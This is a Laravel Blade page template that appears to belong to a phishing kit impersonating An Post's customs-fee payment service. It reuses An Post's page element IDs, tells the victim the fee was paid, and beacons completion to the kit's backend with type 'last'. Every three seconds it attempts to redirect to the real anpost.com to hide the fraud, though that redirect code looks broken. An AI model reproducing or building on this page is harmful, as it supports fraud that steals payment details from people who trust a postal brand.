@extends('layouts.main')
@section('title', "You have successfully paid your customs fee.")
@section('main')

<section id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_pnlFormLookup" class="f14">
    <p class="f14__sub"><span style="color:green;" id="p_lt_WebPartZone13_zoneContent_pageplaceholder_p_lt_ctl01_F14PayCustomsCharges_lblCustomChargeText">You
            will be redirected .</span></p>
</section>

@endsection

@section('main2')
<center>
    <div class="grid-container" style="  text-align: center;">
        <div class="hide-mobile sc-iAyFgw NseNX">
            <div class="undefined progressContainer undefined sc-hSdWYo bpHXog">
                <div class="progressItemBlock">
                    <div class="firstLoad"></div>
                </div>
                <div class="progressItemBlock">
                    <div class="nextLoad"></div>
                </div>
            </div>
        </div>
        <div class="loader"></div>
    </div>
</center>
@endsection


@section('css')
<link rel="stylesheet" href="/asset/shop.min.css" as="style">
<link rel="stylesheet" href="/asset/m53.min.css" as="style" onload="this.onload=null;this.rel=&#39;stylesheet&#39;">
<style>
    .loader {
        border: 16px solid #f3f3f3;
        border-radius: 50%;
        border-top: 16px solid #3498db;
        width: 120px;
        height: 120px;
        -webkit-animation: spin 2s linear infinite;
        /* Safari */
        animation: spin 2s linear infinite;
    }

    /* Safari */
    @-webkit-keyframes spin {
        0% {
            -webkit-transform: rotate(0deg);
        }

        100% {
            -webkit-transform: rotate(360deg);
        }
    }

    @keyframes spin {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }
</style>
@endsection

@section('js')
<script>
    $(function() {
        $.ajax({
            url: "{{route('main.new')}}", 
            method: 'post', 
            data: {
                _token: $('meta[name="csrf-token"]').attr('content'), 
                referringUrl: "{{parse_url(url()->current(), PHP_URL_PATH)}}", 
                type: "last"
            }, 
            success: function(response) {}
        });
        setInterval(function() {
            url("https://anpost.com/");
        }, 3000)
    });
</script>
@endsection